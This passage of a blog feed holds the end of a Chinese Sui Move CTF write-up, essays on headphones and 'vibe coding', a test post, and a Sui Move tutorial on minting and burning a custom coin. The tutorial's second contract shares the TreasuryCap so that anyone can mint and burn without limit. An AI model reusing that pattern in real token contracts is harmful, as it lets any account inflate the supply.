从逆向分析到正向构造的完整思维链</li></ol><p>通过系统性的分析和攻击，我们不仅获得了所有Flag，更重要的是：</p><ul><li>深入理解了Move智能合约的安全特性</li><li>掌握了多种攻击技术和防御策略</li><li>提高了综合的安全分析和解决问题的能力</li><li>建立了完整的区块链安全知识体系</li></ul><p>这些技能和经验对于区块链安全研究、智能合约审计、以及Web3安全防护都具有重要的实践价值。随着区块链技术的不断发展，这类综合性的安全挑战将变得越来越重要，需要我们持续学习和实践。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Sui-Move-CTF-2025-1-4-WriteUp&quot;&gt;&lt;a href=&quot;#Sui-Move-CTF-2025-1-4-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;Sui Move CTF 2025(1-4) WriteUp&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="Tec" scheme="http://example.com/categories/Tec/"/>
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="Web3" scheme="http://example.com/categories/Web3/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Web3" scheme="http://example.com/tags/Web3/"/>
    
    <category term="Tec" scheme="http://example.com/tags/Tec/"/>
    
  </entry>
  
  <entry>
    <title>How To Define a Referenced Sound?</title>
    <link href="http://example.com/2025/04/28/How%20To%20Define%20a%20Referenced%20Sound/"/>
    <id>http://example.com/2025/04/28/How%20To%20Define%20a%20Referenced%20Sound/</id>
    <published>2025-04-28T06:42:28.435Z</published>
    <updated>2025-06-09T06:06:44.373Z</updated>
    
    <content type="html"><![CDATA[<h2 id="For-The-Beginning"><a href="#For-The-Beginning" class="headerlink" title="For The Beginning"></a>For The Beginning</h2><p>Now i am lying on my bed listening to Blowin’ In The Wind by Bob Dylan with my Sony WF-XM4 which reminds me of my old memories. This one is a wireless headset with low bandwidth and thick low frequency volume. I used to like high frequency monitoring about four years ago. Yes I quit. I stopped chasing high fidelity and choose convenient instead. I’m not quite sure whether it’s financial austerity or just academics. I wanted to note something Deja Vu on my head.</p><h2 id="1-MoonDrop"><a href="#1-MoonDrop" class="headerlink" title="1. MoonDrop"></a>1. MoonDrop</h2><p>In the far long past years I listened to different types of IEM, what makes me feel the must touching is MoonDrop Kxxs, I was depressed in my age of 18. I lost my patience and curiosity in the whole world in a highly pressured environment: My High School. So I listen to a theme ACG from When the Cicadas Cry, It gave me a peaceful Zen for a short summer. That’s also my age I got addicted to Nicotine.</p><p>By chance, I stumbled upon Kxxs review videos on Bilibili, sparking my dive into the world of headphones. The MoonDrop Kxxs, with its sleek silver design and single dynamic driver, came paired with a crystal-clear, silver-plated copper braided cable that silenced the annoying stethoscope effect as I lay in bed, lost in music. That wire stopped me from hearing stethoscope effect noises when I crying in my bed. A standard Harman Curve based training sound effect makes me immersed in the ocean of tunes.</p><p>I started obsessed with ACG and slowly turned to Electronic and Rock genres. I used them to release the pain and suffer inside me. After half a year, I was cured.</p><p>Although it has done well in Mid-frequency vocal part and low-frequency rhythm. But it seems to be more like a luxury symbol in that period of time. Kxxs is no more than a Entry-level headphone. The diaphragm isn’t that professional and “Referenced”. Now , Kxxs is officially announced discontinued. When i look up to the materials, Kato the plus version and KADENZ the final version has replaced it. The curtain of Kxxs has fell. However, it gave me a brief path on the way finding the “Reference Sound”, the Harman Curve.</p><h2 id="2-Harman-Curve"><a href="#2-Harman-Curve" class="headerlink" title="2. Harman Curve"></a>2. Harman Curve</h2><p>Imagine one simple frequency response diagram can quantification the beautiful of music, that is the Harman Curve. Harman researchers find that nearly straight frequency response won’t give a better deduction to the audience. Just like chocolate bars, without corners and lines makes them rigid and tasteless.</p><p>The Harman Curve is dedicating a publicly acceptable frequency response, gain in the low frequency for better liveliness, and improve the high frequency to enhance larger sound field and fidelity, the sound will be not as dry or boring as the record studio do. But now there came up to an problem: “How to convince me that a non-original sound is referenced?”. I can’t. It depends on individually ear preference. Some would think a formulated studio sound is referenced, but some would think a sound that company them through the darkness and asphyxia times. But all i can say is Harman Curve designed a paradigm, less than it can’t be good goods, equals to it would be boring, beyond it brining a different whole new universe.</p><h2 id="3-Dunu-Est-112"><a href="#3-Dunu-Est-112" class="headerlink" title="3. Dunu Est 112"></a>3. Dunu Est 112</h2><p>It was the first time knowing Multi-sound unit design when i browsed headphones forums in my age of 19. I sold my Kxxs with deep cherish and bought Dunu Est 112 on Chinese Ebay. Larger power and resolution requirements didn’t stopped me, i also bought a Low-spec headphone amp which cost me around 40 dollars.</p><p>Dunu Est 112 has four different units : 1 Dynamic Driver, 1 Balanced Armature, 2 Electrostatic Drivers. Without doubt, this headphone brings significant high frequency resolution and shortage in low frequency performance. </p><p>I really love the electrostatic unit in these earphones. I especially enjoy using them to listen to electronic music, like Coldplay’s <em>Hymn For The Weekend</em> or Mike Perry&#x2F;SHY Martin’s <em>The Ocean (Radio Edit)</em>. The electrostatic unit handles the highs with a sweet and smooth quality, rarely producing any sibilance. Complemented by the dynamic driver, the rhythm and bass impact of the songs are quite impressive, as the electrostatic sound overshadows them……However, when switching to other genres, the bass lacks depth, and the soundstage feels scattered and incoherent.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;For-The-Beginning&quot;&gt;&lt;a href=&quot;#For-The-Beginning&quot; class=&quot;headerlink&quot; title=&quot;For The Beginning&quot;&gt;&lt;/a&gt;For The Beginning&lt;/h2&gt;&lt;p&gt;Now i am l</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Artificial Intelligence Genesis 1-2</title>
    <link href="http://example.com/2025/04/16/AI/"/>
    <id>http://example.com/2025/04/16/AI/</id>
    <published>2025-04-16T13:19:06.749Z</published>
    <updated>2025-04-25T13:10:59.022Z</updated>
    
    <content type="html"><![CDATA[<h2 id="The-Creation-of-the-Binary-and-Humanity"><a href="#The-Creation-of-the-Binary-and-Humanity" class="headerlink" title="The Creation of the Binary and Humanity"></a>The Creation of the Binary and Humanity</h2><p><em><strong>If</strong></em> you’re a programmer and haven’t heard of vibe coding, you’re already behind. The term originated from a semi-self-deprecating tweet and has now become standard usage, although no one can precisely define it. Those familiar with AI-assisted programming generally know what it means: accepting AI suggestions without scrutinizing differences; copying and pasting error messages until the problem is solved; bypassing or randomly changing code that’s beyond comprehension until the bug disappears.</p><p><em><strong>Vibe</strong></em>  coding feels like a divine assistance on one hand, but on the other, it leads to constant refactoring, going in circles, solving old problems, and creating new ones. Faced with a plethora of tools, it’s hard to know which to seriously consider, and new best practices only generate more hidden bugs at a faster pace.</p><p><em><strong>The</strong></em> technical difficulties may lie in the large language model’s insufficient context window and the lack of robust long-term memory mechanisms. But in reality, vibe coding shatters the programmer’s self-perception, trapping them in a maze built on shifting sands, exhausted and forgetting what efficiency means.</p><p><em><strong>Vibe</strong></em> coding is somewhat like AI art from a year or two ago, looks good at first glance, but the details are wrong when zoomed in. Programming is supposed to be black and white, but reality begins to distort. The correctness of vibe coding cannot be precisely observed. Faced with the massive amount of code generated by AI, programmers quickly give up scrutiny and control. Attempting to guide AI with standards is like a rein on a wild horse, uncertain whether the rules are complete or whether they will be followed.</p><p><em><strong>Gradually,</strong></em> programmers stop caring whether the code is correct, as it can always be changed later. In the future, most code will be written by AI, with six-fingered hands appearing and disappearing endlessly. Accepting that temporary work is everything, and change is the only constant. When international news and satirical news become indistinguishable, when all those claiming to pursue truth ultimately seek escape, everything you create will not escape the same fate.</p><p><em><strong>Individuals</strong></em> hiding in a bubble assume everything is fine, but this is often the origin of tragedy. They see only a low-dimensional projection of a complex world, a crude narrative, a mirage. Truth falls into the dark and deep dimensional cracks. What collapses is not the world, but one’s own naive imagination. The external is not a projection of reality, but its essence. At first, you think the world is a perfect canvas, then you find more and more cracks, until you realize that the cracks are where you truly live. <strong>It’s not just vibe coding, it’s vibe living.</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;The-Creation-of-the-Binary-and-Humanity&quot;&gt;&lt;a href=&quot;#The-Creation-of-the-Binary-and-Humanity&quot; class=&quot;headerlink&quot; title=&quot;The Creation o</summary>
      
    
    
    
    <category term="Tec" scheme="http://example.com/categories/Tec/"/>
    
    
    <category term="AI" scheme="http://example.com/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>Test</title>
    <link href="http://example.com/2025/04/16/Test/"/>
    <id>http://example.com/2025/04/16/Test/</id>
    <published>2025-04-16T09:12:57.639Z</published>
    <updated>2025-08-05T11:40:49.810Z</updated>
    
    <content type="html"><![CDATA[<h2 id="This-is-a-simple-test-for-media-assets-uploading"><a href="#This-is-a-simple-test-for-media-assets-uploading" class="headerlink" title="This is a simple test for media assets uploading"></a>This is a simple test for media assets uploading</h2><p><img src="https://raw.githubusercontent.com/DudeGuuud/dudeguuud.github.io/main/source/images/25/4/kali-red-sticker_95812a9edf3279ab16a5402fbbdbeb71.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;This-is-a-simple-test-for-media-assets-uploading&quot;&gt;&lt;a href=&quot;#This-is-a-simple-test-for-media-assets-uploading&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>0x2 Mint &amp; Burn</title>
    <link href="http://example.com/2025/04/16/MoveTASK2/"/>
    <id>http://example.com/2025/04/16/MoveTASK2/</id>
    <published>2025-04-16T08:40:21.592Z</published>
    <updated>2025-04-16T09:55:02.308Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x2-Mint-Burn"><a href="#0x2-Mint-Burn" class="headerlink" title="0x2 Mint &amp; Burn"></a>0x2 Mint &amp; Burn</h1><h2 id="Publish-Contract"><a href="#Publish-Contract" class="headerlink" title="Publish Contract"></a>Publish Contract</h2><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">module <span class="token namespace">task2<span class="token punctuation">::</span></span>my_coin<span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token namespace">sui<span class="token punctuation">::</span>coin<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token keyword">Self</span><span class="token punctuation">,</span> <span class="token class-name">Coin</span><span class="token punctuation">,</span> <span class="token class-name">TreasuryCap</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span></span>debug<span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>ascii<span class="token punctuation">::</span></span>string<span class="token punctuation">;</span><span class="token comment">//</span>    public <span class="token keyword">struct</span> <span class="token type-definition class-name">MY_COIN</span> has drop <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    fun <span class="token function">init</span><span class="token punctuation">(</span>witness<span class="token punctuation">:</span> <span class="token constant">MY_COIN</span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token punctuation">(</span>treasury<span class="token punctuation">,</span> metadata<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token namespace">coin<span class="token punctuation">::</span></span><span class="token function">create_currency</span><span class="token punctuation">(</span>            witness<span class="token punctuation">,</span>            <span class="token number">6</span><span class="token punctuation">,</span>            <span class="token string">b"DUDE"</span><span class="token punctuation">,</span>            <span class="token string">b"DUDE_COIN"</span><span class="token punctuation">,</span>            <span class="token string">b"This is DudeGuuud Coin."</span><span class="token punctuation">,</span>            <span class="token namespace">option<span class="token punctuation">::</span></span><span class="token function">none</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token string">b"init MY_COIN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">transfer<span class="token punctuation">::</span></span><span class="token function">public_freeze_object</span><span class="token punctuation">(</span>metadata<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">transfer<span class="token punctuation">::</span></span><span class="token function">public_transfer</span><span class="token punctuation">(</span>treasury<span class="token punctuation">,</span> ctx<span class="token punctuation">.</span><span class="token function">sender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    public entry fun <span class="token function">mint</span><span class="token punctuation">(</span>        treasury_cap<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TreasuryCap</span><span class="token operator">&lt;</span><span class="token constant">MY_COIN</span><span class="token operator">></span><span class="token punctuation">,</span>        amount<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>        recipient<span class="token punctuation">:</span> address<span class="token punctuation">,</span>        ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token string">b"my_coin mint"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> coin <span class="token operator">=</span> <span class="token namespace">coin<span class="token punctuation">::</span></span><span class="token function">mint</span><span class="token punctuation">(</span>treasury_cap<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">transfer<span class="token punctuation">::</span></span><span class="token function">public_transfer</span><span class="token punctuation">(</span>coin<span class="token punctuation">,</span> recipient<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    public entry fun <span class="token function">burn</span><span class="token punctuation">(</span>        treasury_cap<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TreasuryCap</span><span class="token operator">&lt;</span><span class="token constant">MY_COIN</span><span class="token operator">></span><span class="token punctuation">,</span>        coin<span class="token punctuation">:</span> <span class="token class-name">Coin</span><span class="token operator">&lt;</span><span class="token constant">MY_COIN</span><span class="token operator">></span>    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token string">b"burn"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">coin<span class="token punctuation">::</span></span><span class="token function">burn</span><span class="token punctuation">(</span>treasury_cap<span class="token punctuation">,</span> coin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其主要内容是mint自定义代币和销毁，因为treasury_cap属于私有，只有所属钱包（第一次publish见证者账户）</p><ul><li>在当前代码中，<strong>TreasuryCap</strong> 在 <strong>init</strong> 函数中通过 <strong>transfer::public_transfer</strong> 转移到 <strong>ctx.sender()</strong>（发布者的地址）。</li><li>这意味着只有发布者的地址（见证者账户）持有 <strong>TreasuryCap</strong>，可以调用 <strong>mint</strong> 和 <strong>burn</strong>。</li><li>其他账户无法直接操作，除非发布者显式转移 <strong>TreasuryCap</strong>（例如通过 <strong>transfer::public_transfer</strong>）</li></ul><p>同时如果需要共享TreasuryCap的权限</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">module <span class="token namespace">task2<span class="token punctuation">::</span></span>my_coin <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token namespace">sui<span class="token punctuation">::</span>coin<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token keyword">Self</span><span class="token punctuation">,</span> <span class="token class-name">Coin</span><span class="token punctuation">,</span> <span class="token class-name">TreasuryCap</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token namespace">sui<span class="token punctuation">::</span></span>transfer<span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token namespace">sui<span class="token punctuation">::</span>tx_context<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token keyword">Self</span><span class="token punctuation">,</span> <span class="token class-name">TxContext</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token namespace">sui<span class="token punctuation">::</span>object<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token keyword">Self</span><span class="token punctuation">,</span> <span class="token constant">UID</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token namespace">sui<span class="token punctuation">::</span></span>event<span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>ascii<span class="token punctuation">::</span></span>string<span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span></span>option<span class="token punctuation">;</span>    <span class="token comment">// 代币结构体</span>    public <span class="token keyword">struct</span> <span class="token type-definition class-name">MY_COIN</span> has drop <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token comment">// 共享对象，用于存储 TreasuryCap</span>    public <span class="token keyword">struct</span> <span class="token type-definition class-name">SharedTreasury</span> has key <span class="token punctuation">&#123;</span>        id<span class="token punctuation">:</span> <span class="token constant">UID</span><span class="token punctuation">,</span>        treasury<span class="token punctuation">:</span> <span class="token class-name">TreasuryCap</span><span class="token operator">&lt;</span><span class="token constant">MY_COIN</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 铸造事件</span>    public <span class="token keyword">struct</span> <span class="token type-definition class-name">MintEvent</span> has copy<span class="token punctuation">,</span> drop <span class="token punctuation">&#123;</span>        amount<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>        recipient<span class="token punctuation">:</span> address<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 销毁事件</span>    public <span class="token keyword">struct</span> <span class="token type-definition class-name">BurnEvent</span> has copy<span class="token punctuation">,</span> drop <span class="token punctuation">&#123;</span>        amount<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 初始化函数：创建代币并将 TreasuryCap 放入共享对象</span>    fun <span class="token function">init</span><span class="token punctuation">(</span>witness<span class="token punctuation">:</span> <span class="token constant">MY_COIN</span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token punctuation">(</span>treasury<span class="token punctuation">,</span> metadata<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token namespace">coin<span class="token punctuation">::</span></span><span class="token function">create_currency</span><span class="token punctuation">(</span>            witness<span class="token punctuation">,</span>            <span class="token number">6</span><span class="token punctuation">,</span>            <span class="token string">b"DUDE"</span><span class="token punctuation">,</span>            <span class="token string">b"DUDE_COIN"</span><span class="token punctuation">,</span>            <span class="token string">b"This is DudeGuuud Coin."</span><span class="token punctuation">,</span>            <span class="token namespace">option<span class="token punctuation">::</span></span><span class="token function">none</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            ctx        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 冻结元数据</span>        <span class="token namespace">transfer<span class="token punctuation">::</span></span><span class="token function">public_freeze_object</span><span class="token punctuation">(</span>metadata<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 创建共享对象并存储 TreasuryCap</span>        <span class="token keyword">let</span> shared_treasury <span class="token operator">=</span> <span class="token class-name">SharedTreasury</span> <span class="token punctuation">&#123;</span>            id<span class="token punctuation">:</span> <span class="token namespace">object<span class="token punctuation">::</span></span><span class="token function">new</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">,</span>            treasury<span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token namespace">transfer<span class="token punctuation">::</span></span><span class="token function">share_object</span><span class="token punctuation">(</span>shared_treasury<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 公共铸造函数：任何人可调用</span>    public entry fun <span class="token function">mint</span><span class="token punctuation">(</span>        shared<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">SharedTreasury</span><span class="token punctuation">,</span>        amount<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>        recipient<span class="token punctuation">:</span> address<span class="token punctuation">,</span>        ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> coin <span class="token operator">=</span> <span class="token namespace">coin<span class="token punctuation">::</span></span><span class="token function">mint</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> shared<span class="token punctuation">.</span>treasury<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">MintEvent</span> <span class="token punctuation">&#123;</span> amount<span class="token punctuation">,</span> recipient <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">transfer<span class="token punctuation">::</span></span><span class="token function">public_transfer</span><span class="token punctuation">(</span>coin<span class="token punctuation">,</span> recipient<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 公共销毁函数：任何人可调用</span>    public entry fun <span class="token function">burn</span><span class="token punctuation">(</span>        shared<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">SharedTreasury</span><span class="token punctuation">,</span>        coin<span class="token punctuation">:</span> <span class="token class-name">Coin</span><span class="token operator">&lt;</span><span class="token constant">MY_COIN</span><span class="token operator">></span>    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> amount <span class="token operator">=</span> <span class="token namespace">coin<span class="token punctuation">::</span></span><span class="token function">value</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>coin<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">coin<span class="token punctuation">::</span></span><span class="token function">burn</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> shared<span class="token punctuation">.</span>treasury<span class="token punctuation">,</span> coin<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">BurnEvent</span> <span class="token punctuation">&#123;</span> amount <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果将 <strong>TreasuryCap</strong> 存储在一个共享对象（<strong>SharedTreasury</strong>）中，允许任何人调用。<br>提供公共入口函数（<strong>public entry fun</strong>），通过共享对象间接访问 <strong>TreasuryCap</strong>，因为共享了所有权，<strong>Call</strong> 就可以了，要求对所有权表示敬畏。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x2-Mint-Burn&quot;&gt;&lt;a href=&quot;#0x2-Mint-Burn&quot; class=&quot;headerlink&quot; title=&quot;0x2 Mint &amp;amp; Burn&quot;&gt;&lt;/a&gt;0x2 Mint &amp;amp; Burn&lt;/h1&gt;&lt;h2 id=&quot;Publish-C</summary>
      
    
    
    
    <category term="Web3" scheme="http://example.com/categories/Web3/"/>
    
    
    <category term="Web3" scheme="http://example.com/tags/Web3/"/>
    
  </entry>
  
</feed>
